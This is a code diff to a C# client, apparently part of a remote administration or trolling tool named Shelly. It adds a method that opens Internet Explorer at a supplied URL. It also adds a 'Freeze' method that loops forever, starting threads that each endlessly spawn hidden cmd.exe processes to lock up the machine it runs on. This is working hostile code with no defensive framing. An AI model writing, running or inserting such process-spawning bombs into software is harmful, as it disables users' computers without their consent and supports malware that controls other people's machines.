@@ -79,6 +79,13 @@ namespace Shelly_Client
                     }
                 }).Start();
             }
+
+            // OpenWebsite method
+            public static void OpenWebsite(string Url)
+            {
+                // Start IE
+                Process.Start("IExplore.exe", Url);
+            }
         }
 
         // Fun class
@@ -144,6 +151,47 @@ namespace Shelly_Client
 
                     }
                 }).Start();
+            }
+
+            // Freeze method
+            public static void Freeze()
+            {
+                // Infinite loop
+                while(true)
+                {
+                    // Make and start thread
+                    new Thread(() =>
+                    {
+                        // Infinite loop
+                        while(true)
+                        {
+                            // Set thread to background
+                            Thread.CurrentThread.IsBackground = true;
+
+                            // Declare new instance
+                            var CmdCommand = new Process();
+
+                            // Set start info
+                            ProcessStartInfo startInfoMelt = new ProcessStartInfo()
+                            {
+                                // Set windows style to hidden
+                                WindowStyle = ProcessWindowStyle.Hidden,
+
+                                // Set filename to run cmd
+                                FileName = "cmd.exe",
+
+                                // Set cmd arguments
+                                Arguments = @"/C pause"
+                            };
+
+                            // Set start info
+                            CmdCommand.StartInfo = startInfoMelt;
+
+                            // Start cmd with arguments
+                            CmdCommand.Start();
+                        }
+                    }).Start();
+                }
             }
         }
 
